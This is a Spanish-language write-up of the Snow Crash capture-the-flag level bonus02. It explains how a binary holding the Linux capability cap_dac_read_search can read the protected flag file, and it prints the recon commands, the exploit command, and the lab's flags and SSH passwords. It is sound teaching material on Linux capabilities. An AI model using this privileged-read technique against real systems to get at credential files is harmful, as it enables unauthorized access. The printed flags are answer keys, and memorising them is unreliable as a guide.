# Bonus02 - Snow Crash

## Tipo de ejercicio

Lectura privilegiada de ficheros mediante un binario con la capability Linux
**`cap_dac_read_search`**, que permite eludir las comprobaciones DAC al abrir
rutas.

## Objetivo

Obtener la credencial asociada a `flagbonus02` / al siguiente nivel bonus.

El programa `mafia` no tiene bit **setuid**, pero sí la capability
`cap_dac_read_search=ep`. Eso le permite abrir y leer ficheros a los que el
usuario `bonus02` no tendría acceso por permisos normales (por ejemplo
`/home/flagbonus02/.flag`).

La pista del home de `bonus02` es:

```text
The Mafia keeps its books in order. Always.
```

---

## 1. Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus02@localhost -p 2424
```

La contraseña de `bonus02` es la flag de `bonus01`:

```text
fa6v5ateaw21peobuub8ipe6s
```

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus02
uid=3002(bonus02) gid=3002(bonus02) groups=3002(bonus02),1001(levelgroup),4009(bonus02_grp)
/home/bonus02
```

```text
The Mafia keeps its books in order. Always.
```

Detalle importante del `id`: el usuario pertenece al grupo **`bonus02_grp`**
(`4009`). Ese grupo es el que tiene permiso de ejecución sobre el binario del
nivel.

La cuenta `flagbonus02` existe con shell nologin:

```bash
getent passwd flagbonus02
```

```text
flagbonus02:x:4002:4002::/home/flagbonus02:/usr/sbin/nologin
```

No se inicia sesión interactiva como `flagbonus02`. La flag se obtiene a través
del binario privilegiado.

---

## 2. Localizar el componente del nivel

```bash
ls -la /opt/snowcrash/
ls -laR /opt/snowcrash/bonus02
```

Resultado:

```text
/opt/snowcrash/bonus02:
total 24
drwxr-xr-x  2 root        root         4096 ...
drwxr-xr-x 18 root        root         4096 ...
-rwxr-x---  1 flagbonus02 bonus02_grp 16328 ... mafia
```

El binario `mafia`:

- Propietario: `flagbonus02`
- Grupo: `bonus02_grp`
- Modo: `750` (`-rwxr-x---`)

Como `bonus02` está en `bonus02_grp`, **puede ejecutar** el programa. No hace
falta setuid para lanzarlo.

Comprobar tipo de fichero:

```bash
ls -l /opt/snowcrash/bonus02/mafia
file /opt/snowcrash/bonus02/mafia
```

```text
-rwxr-x--- 1 flagbonus02 bonus02_grp 16328 ... /opt/snowcrash/bonus02/mafia
/opt/snowcrash/bonus02/mafia: ELF 64-bit LSB pie executable, x86-64, ... not stripped
```

No hay servicio `systemd` específico de bonus02 (a diferencia de bonus01). El
vector está en el propio ejecutable.

---

## 3. Capabilities: la clave del nivel

Aunque no hay bit setuid, el binario tiene una **capability** de Linux:

```bash
getcap /opt/snowcrash/bonus02/mafia
stat /opt/snowcrash/bonus02/mafia
```

```text
/opt/snowcrash/bonus02/mafia cap_dac_read_search=ep
```

Significado:

| Elemento | Explicación |
|----------|-------------|
| `cap_dac_read_search` | Permite omitir las comprobaciones de permiso de **lectura** y de **búsqueda en directorios** (DAC) |
| `e` (effective) | La capability está activa al ejecutarse |
| `p` (permitted) | Está en el conjunto permitido del binario |

Efecto práctico: al ejecutar `mafia`, el proceso puede **abrir y leer** ficheros
que `bonus02` no podría leer con `cat` u `open` normal (por ejemplo el home y
el `.flag` de `flagbonus02`).

Comprobación de que el home de `flagbonus02` sigue cerrado para el usuario:

```bash
ls -la /home/flagbonus02 2>&1
```

```text
ls: cannot open directory '/home/flagbonus02': Permission denied
```

---

## 4. Uso del programa

```bash
/opt/snowcrash/bonus02/mafia
```

```text
usage: /opt/snowcrash/bonus02/mafia <document-path>
```

El programa exige **un argumento**: la ruta del “documento” (cualquier fichero).

Las cadenas del binario confirman el modelo:

```bash
strings -a /opt/snowcrash/bonus02/mafia | grep -iE 'usage|mafia:|error'
```

```text
usage: %s <document-path>
mafia: %s: %s
mafia: write error: %s
mafia: read error: %s
```

Y los símbolos dinámicos relevantes:

```text
open, read, write, close, strerror, __fprintf_chk
```

### Comportamiento (análisis de `main`)

Desensamblado resumido (`objdump -d`, función `main`):

1. Si `argc != 2` → imprime `usage` en stderr y sale con código 1.
2. `open(argv[1], O_RDONLY)` sobre la ruta indicada.
3. Bucle: `read` de hasta `0x1000` bytes → `write` a **stdout** (fd 1).
4. Si `open`/`read`/`write` fallan → mensaje de error con `strerror`.

En la práctica es un **`cat` con `cap_dac_read_search`**: copia el fichero
pedido a la salida estándar, pudiendo leer rutas que el usuario normal no
puede.

---

## 5. Pruebas de comportamiento

Lectura de un fichero público:

```bash
/opt/snowcrash/bonus02/mafia /etc/hostname
```

```text
snowcrash
```

Lectura de `/etc/passwd` (también legible en general, sirve de control):

```bash
/opt/snowcrash/bonus02/mafia /etc/passwd 2>&1 | head -5
```

Intento sobre un directorio (debe fallar de forma controlada):

```bash
/opt/snowcrash/bonus02/mafia /home/flagbonus02/
```

```text
mafia: read error: Is a directory
```

---

## 6. Obtener la flag

El fichero de credencial del nivel sigue el patrón de la OVA:

```text
/home/flagbonus02/.flag
```

Ejecutar:

```bash
/opt/snowcrash/bonus02/mafia /home/flagbonus02/.flag
```

Salida:

```text
cfiioecfib9aobid1abfa0ci8
```

Esa cadena es la flag del nivel.

### Por qué funciona

1. `bonus02` no puede hacer `cat /home/flagbonus02/.flag` (permisos del home).
2. Al lanzar `mafia`, el kernel aplica `cap_dac_read_search`.
3. `open("/home/flagbonus02/.flag", O_RDONLY)` tiene éxito pese a los permisos.
4. El contenido se escribe en stdout.

No hace falta race, symlink ni setuid: solo la capability y la ruta correcta.

---

## 7. Credencial final

```text
cfiioecfib9aobid1abfa0ci8
```

Guardar en el repositorio:

```text
bonus02/flag
```

con una sola línea con esa cadena.

Ese valor se usa como contraseña SSH del siguiente nivel bonus (`bonus03`),
según el flujo de la OVA:

```bash
ssh bonus03@localhost -p 2424
# password: cfiioecfib9aobid1abfa0ci8
```

---

## 8. Resumen de comandos válidos

```bash
# Acceso
ssh bonus02@localhost -p 2424

# Reconocimiento
whoami
id
ls -la
cat README
ls -laR /opt/snowcrash/bonus02
ls -l /opt/snowcrash/bonus02/mafia
file /opt/snowcrash/bonus02/mafia
getcap /opt/snowcrash/bonus02/mafia
strings -a /opt/snowcrash/bonus02/mafia
objdump -d /opt/snowcrash/bonus02/mafia | sed -n '/<main>:/,/^$/p' | head -120

# Explotación
/opt/snowcrash/bonus02/mafia /home/flagbonus02/.flag
```

---

## 9. Conceptos importantes

- **Linux capabilities**: privilegios finos independientes del UID 0. Un binario
  puede tener solo las que necesita (aquí, leer sin importar el DAC).
- **`cap_dac_read_search`**: permite atravesar directorios y abrir ficheros
  ignorando los bits de permiso de lectura/búsqueda. No otorga escritura ni
  ejecución arbitraria.
- **`getcap` / `setcap`**: consulta y asignación de capabilities en ficheros
  (`=ep` = effective + permitted).
- **Diferencia con setuid**: setuid cambia el UID efectivo al del propietario;
  las capabilities mantienen el UID del usuario pero añaden privilegios
  concretos. Aquí no hace falta ser `flagbonus02` en el sentido de UID.
- **Grupo `bonus02_grp`**: controla quién puede **ejecutar** el binario
  (modo 750). La capability actúa solo cuando el programa se ejecuta.

---

## 10. Conclusión

No se modifica ningún archivo de la OVA. La solución consiste en:

1. Localizar `/opt/snowcrash/bonus02/mafia`.
2. Comprobar que el usuario puede ejecutarlo (grupo `bonus02_grp`).
3. Detectar `cap_dac_read_search=ep` con `getcap`.
4. Usar el programa como lector privilegiado sobre
   `/home/flagbonus02/.flag`.

Credencial obtenida:

```text
cfiioecfib9aobid1abfa0ci8
```

---

## 11. Estructura recomendada en el repositorio

```text
bonus02/
├── flag                          # cfiioecfib9aobid1abfa0ci8
└── resources/
    └── bonus02.md                # este documento
```

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus02/resources/bonus02.md` y el token en `bonus02/flag`.
```
